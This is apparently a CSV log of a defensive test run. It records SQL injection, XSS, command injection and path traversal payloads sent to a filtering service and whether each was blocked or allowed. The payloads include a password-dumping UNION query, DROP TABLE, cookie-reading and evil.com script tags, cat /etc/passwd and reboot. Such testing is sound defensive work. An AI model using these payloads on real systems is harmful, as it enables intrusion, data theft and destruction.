timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,response_body
2025-10-12T18:21:45.806202,SQLi,Classic Tautology,' OR 1=1--,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:45.812187,SQLi,Classic Tautology,' OR 1=1--,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:45.918467,SQLi,Tautology with Comment,' OR 'a'='a,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:45.920667,SQLi,Tautology with Comment,' OR 'a'='a,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.025457,SQLi,Boolean-based Blind,AND 1=1,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.031569,SQLi,Boolean-based Blind,AND 1=1,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.137627,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""SQLi Union"", ""status"": ""pattern_received""}"
2025-10-12T18:21:46.144534,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""SQLi Union"", ""status"": ""pattern_received""}"
2025-10-12T18:21:46.252736,SQLi,Stacked Query,'; DROP TABLE members;--,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.259206,SQLi,Stacked Query,'; DROP TABLE members;--,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.368445,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.374537,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.482755,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.489052,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.593516,SQLi,Authentication Bypass,admin'--,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.599774,SQLi,Authentication Bypass,admin'--,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.706796,SQLi,Double Quote Tautology,""" OR 1=1--",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.713042,SQLi,Double Quote Tautology,""" OR 1=1--",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.819256,SQLi,Wildcard Bypass,' OR '%'=',Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.825492,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:46.931854,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:21:46.939228,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:21:47.048716,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:21:47.063207,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:21:47.171504,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.177138,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.281510,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.286986,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.395166,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.402278,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.511065,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:21:47.518784,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:21:47.627617,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.634362,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.743590,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.750445,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.856787,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.863083,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.967674,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:47.974440,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.082231,Cmd Injection,Simple Pipe,| whoami,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.086331,Cmd Injection,Simple Pipe,| whoami,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.190653,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:21:48.197993,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:21:48.307303,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:21:48.313951,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:21:48.422977,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.430164,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.538672,Cmd Injection,Backticks,`uname -a`,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:21:48.545626,Cmd Injection,Backticks,`uname -a`,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:21:48.657010,Cmd Injection,Command Substitution,$(reboot),Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.664042,Cmd Injection,Command Substitution,$(reboot),Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.769271,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,True,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.776713,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,True,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.885932,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T18:21:48.890603,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T18:21:48.993810,Path Traversal,Root Directory,/etc/shadow,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:48.998674,Path Traversal,Root Directory,/etc/shadow,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:49.106774,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:49.114053,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
